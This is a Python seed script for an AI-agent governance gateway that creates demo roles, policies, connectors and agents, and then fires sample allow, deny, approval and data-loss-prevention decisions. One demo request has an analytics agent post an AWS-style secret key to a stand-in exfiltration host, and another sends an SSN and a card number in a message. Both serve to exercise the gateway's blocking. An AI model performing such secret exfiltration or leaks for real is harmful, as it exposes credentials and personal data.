"""Seed the control plane with a realistic governance configuration + demo traffic.

Run via ``agentguard seed`` (or ``python -m scripts.seed``). Safe to re-run; use
``reset=True`` to wipe first. Prints the freshly minted agent API keys.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path

from sqlalchemy import select

from .database import Base, SessionLocal, engine, init_db
from .gateway_service import authorize_action
from .models import (
    Agent,
    AgentStatus,
    Connector,
    ConnectorAuth,
    Effect,
    Organization,
    Policy,
    Role,
)
from .policy.engine import ActionRequest
from .security import generate_api_key
from .vault import encrypt_secret

# Matches examples/mock_upstream.py — the plane holds this; agents never see it.
_UPSTREAM_KEY = "upstream-super-secret-key-do-not-leak"
_UPSTREAM_URL = "http://127.0.0.1:9100"

# A tiny local database that stands in for a production data warehouse, so the
# read-only SQL connector is demoable out of the box.
_WAREHOUSE_PATH = "./demo_warehouse.db"


_TICKETS_PATH = "./demo_tickets.db"


def _build_demo_warehouse() -> str:
    """Create the demo warehouse sqlite DB (idempotent). Returns its DSN."""
    import sqlite3

    conn = sqlite3.connect(_WAREHOUSE_PATH)
    conn.execute("DROP TABLE IF EXISTS customers")
    conn.execute(
        "CREATE TABLE customers (id INTEGER, name TEXT, email TEXT, ssn TEXT, "
        "tier TEXT, lifetime_value REAL)"
    )
    conn.executemany(
        "INSERT INTO customers VALUES (?,?,?,?,?,?)",
        [
            (1042, "Dana Reyes", "dana.reyes@example.com", "452-11-9832", "vip", 18450.0),
            (1043, "Sam Okafor", "sam.okafor@example.com", "610-22-7788", "standard", 1220.0),
            (1044, "Priya Nair", "priya.nair@example.com", "301-55-4410", "vip", 27600.0),
        ],
    )
    conn.commit()
    conn.close()
    return f"sqlite:///{_WAREHOUSE_PATH}"


def _build_demo_tickets() -> str:
    """Create the demo (writable) tickets sqlite DB. Returns its DSN."""
    import sqlite3

    conn = sqlite3.connect(_TICKETS_PATH)
    conn.execute("DROP TABLE IF EXISTS tickets")
    conn.execute("CREATE TABLE tickets (id INTEGER, subject TEXT, status TEXT)")
    conn.executemany(
        "INSERT INTO tickets VALUES (?,?,?)",
        [
            (5001, "Refund not received", "open"),
            (5002, "Cannot log in", "open"),
            (5003, "Update billing address", "open"),
        ],
    )
    conn.commit()
    conn.close()
    return f"sqlite:///{_TICKETS_PATH}"


@dataclass
class RoleSpec:
    name: str
    description: str
    policies: list[dict]


ROLE_SPECS: list[RoleSpec] = [
    RoleSpec(
        name="customer-support-agent",
        description="Reads CRM records and sends templated replies via the helpdesk API.",
        policies=[
            dict(name="read-crm", effect=Effect.ALLOW, resource="db:customers:*",
                 actions=["read", "db.read"], priority=10),
            dict(name="reply-via-helpdesk", effect=Effect.ALLOW,
                 resource="http:api.helpdesk.local/**", actions=["http.post"], priority=10),
            dict(name="no-crm-writes", effect=Effect.DENY, resource="db:customers:*",
                 actions=["write", "db.write", "delete"], priority=100),
            # Enforced mode: may READ single customer records via the crm connector.
            dict(name="crm-read-via-connector", effect=Effect.ALLOW,
                 resource="http:crm/customers/*", actions=["http.get"], priority=10),
            # Governed writes: may update a support ticket's status (row-capped).
            dict(name="update-tickets", effect=Effect.ALLOW, resource="db:tickets",
                 actions=["db.update"], priority=10),
        ],
    ),
    RoleSpec(
        name="billing-agent",
        description="Issues refunds up to $5k; anything over $500 needs human approval.",
        policies=[
            dict(name="read-invoices", effect=Effect.ALLOW, resource="db:invoices:*",
                 actions=["read", "db.read"], priority=10),
            dict(name="issue-refunds", effect=Effect.ALLOW, resource="payment:stripe:refund",
                 actions=["payment.refund", "payment.transfer"],
                 conditions={
                     "max_amount": 5000,
                     "require_approval_over": 500,
                     "rate_limit": {"count": 20, "per_seconds": 60},
                 }, priority=10),
            # Enforced mode: issue refunds via the payments connector; >$500 => approval.
            dict(name="refunds-via-connector", effect=Effect.ALLOW,
                 resource="http:payments/refunds", actions=["http.post"],
                 conditions={"max_amount": 5000, "require_approval_over": 500}, priority=10),
        ],
    ),
    RoleSpec(
        name="data-analyst-agent",
        description="Read-only analytics access. All external egress is denied.",
        policies=[
            dict(name="read-analytics", effect=Effect.ALLOW, resource="db:analytics:**",
                 actions=["read", "db.read", "db.query"], priority=10),
            # Enforced mode: read-only SQL against the warehouse database connector.
            dict(name="query-warehouse", effect=Effect.ALLOW, resource="db:warehouse",
                 actions=["db.select"], priority=10),
            dict(name="block-egress", effect=Effect.DENY, resource="http:**",
                 actions=["*"], priority=100),
        ],
    ),
    RoleSpec(
        name="devops-agent",
        description="Restarts services, but only inside the 09:00–17:00 UTC change window.",
        policies=[
            dict(name="read-infra", effect=Effect.ALLOW, resource="infra:**",
                 actions=["read", "infra.read"], priority=10),
            dict(name="restart-in-window", effect=Effect.ALLOW, resource="infra:service:*",
                 actions=["ops.restart"],
                 conditions={"time_window": {"start": "09:00", "end": "17:00"}}, priority=10),
        ],
    ),
]

AGENT_SPECS = [
    ("SupportBot-Prod", "customer-support-agent", "support-team@corp.example"),
    ("BillingBot", "billing-agent", "finance@corp.example"),
    ("AnalyticsBot", "data-analyst-agent", "data@corp.example"),
    ("DeployBot", "devops-agent", "platform@corp.example"),
]


def _reset() -> None:
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)
    # A full reset is a legitimate operator action; clear the head anchor too so
    # the fresh (shorter) ledger is not flagged as a truncation of the old one,
    # and drop the verified-prefix cache which no longer matches any DB state.
    from .audit.ledger import reset_chain_cache
    from .config import get_settings

    reset_chain_cache()
    anchor = get_settings().audit_anchor_path
    if anchor:
        Path(anchor).unlink(missing_ok=True)


def seed(reset: bool = False, with_traffic: bool = True) -> dict[str, str]:
    if reset:
        _reset()
    init_db()

    created_keys: dict[str, str] = {}
    with SessionLocal() as db:
        # All demo data belongs to the default organization (tenant).
        org = db.scalar(select(Organization).where(Organization.slug == "default"))
        if not org:
            org = Organization(name="Default", slug="default")
            db.add(org)
            db.flush()
        oid = org.id

        # Upstream connectors the plane calls on agents' behalf (credential held here).
        for cname, auth_type, header in [
            ("crm", ConnectorAuth.HEADER, "X-API-Key"),
            ("payments", ConnectorAuth.BEARER, "Authorization"),
        ]:
            if not db.scalar(select(Connector).where(Connector.name == cname)):
                db.add(Connector(
                    org_id=oid,
                    name=cname,
                    description=f"Demo {cname} connector -> mock upstream",
                    kind="http",
                    base_url=_UPSTREAM_URL,
                    auth_type=auth_type,
                    auth_header_name=header,
                    auth_secret_encrypted=encrypt_secret(_UPSTREAM_KEY),
                ))

        # Read-only database connector: the DSN is vaulted; base_url is just a
        # label (so the DSN's credentials are never exposed via the API).
        if not db.scalar(select(Connector).where(Connector.name == "warehouse")):
            db.add(Connector(
                org_id=oid,
                name="warehouse",
                description="Demo read-only data warehouse (SQL connector)",
                kind="database",
                base_url="analytics-warehouse",
                auth_type=ConnectorAuth.NONE,
                auth_secret_encrypted=encrypt_secret(_build_demo_warehouse()),
            ))

        # Writable database connector: governed INSERT/UPDATE/DELETE, capped at
        # 3 affected rows per write (larger writes are rolled back).
        if not db.scalar(select(Connector).where(Connector.name == "tickets")):
            db.add(Connector(
                org_id=oid,
                name="tickets",
                description="Demo writable support-tickets DB (governed writes)",
                kind="database",
                base_url="support-tickets",
                auth_type=ConnectorAuth.NONE,
                auth_secret_encrypted=encrypt_secret(_build_demo_tickets()),
                writable=True,
                max_write_rows=3,
            ))
        db.commit()

        role_by_name: dict[str, Role] = {}
        for spec in ROLE_SPECS:
            role = db.scalar(select(Role).where(Role.name == spec.name))
            if not role:
                role = Role(name=spec.name, description=spec.description, org_id=oid)
                db.add(role)
                db.flush()
                for pol in spec.policies:
                    db.add(Policy(role_id=role.id, **pol))
            role_by_name[spec.name] = role
        db.commit()

        for name, role_name, owner in AGENT_SPECS:
            if db.scalar(select(Agent).where(Agent.name == name)):
                continue
            plaintext, key_hash, prefix = generate_api_key()
            agent = Agent(
                org_id=oid,
                name=name,
                description=f"Demo {role_name}",
                role_id=role_by_name[role_name].id,
                owner=owner,
                quota=10_000,
                api_key_hash=key_hash,
                api_key_prefix=prefix,
                status=AgentStatus.ACTIVE,
            )
            db.add(agent)
            db.commit()
            created_keys[name] = plaintext

        if with_traffic:
            _generate_demo_traffic(db)

    return created_keys


def _generate_demo_traffic(db) -> None:
    """Fire a spread of allow / deny / approval / DLP-block decisions."""
    def agent(name: str) -> Agent | None:
        return db.scalar(select(Agent).where(Agent.name == name))

    scenarios = [
        ("SupportBot-Prod", ActionRequest(
            "db.read", "db:customers:1042",
            payload={"query": "SELECT name,email FROM customers WHERE id=1042"})),
        ("SupportBot-Prod", ActionRequest(
            "db.write", "db:customers:1042", payload={"set": {"tier": "vip"}})),
        ("SupportBot-Prod", ActionRequest(
            "http.post", "http:api.helpdesk.local/messages",
            payload={"to": "cust@x.com", "body": "Your SSN 452-11-9832 is on file; "
                     "card 4111 1111 1111 1111 confirmed."})),
        ("BillingBot", ActionRequest(
            "payment.refund", "payment:stripe:refund",
            payload={"invoice": "inv_88"}, metadata={"amount": 200})),
        ("BillingBot", ActionRequest(
            "payment.refund", "payment:stripe:refund",
            payload={"invoice": "inv_91"}, metadata={"amount": 900})),
        ("AnalyticsBot", ActionRequest(
            "db.query", "db:analytics:events",
            payload={"query": "SELECT count(*) FROM events"})),
        ("AnalyticsBot", ActionRequest(
            "http.post", "http:evil-collector.io/exfil",
            payload={"dump": "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"})),
        ("DeployBot", ActionRequest(
            "infra.read", "infra:service:api", payload={"probe": "status"})),
    ]
    for name, req in scenarios:
        a = agent(name)
        if a:
            authorize_action(db, a, req)


if __name__ == "__main__":  # pragma: no cover
    keys = seed(reset=False)
    if keys:
        print("Created agents (store these keys securely — shown once):")
        for name, key in keys.items():
            print(f"  {name:18} {key}")
    else:
        print("No new agents created (already seeded).")
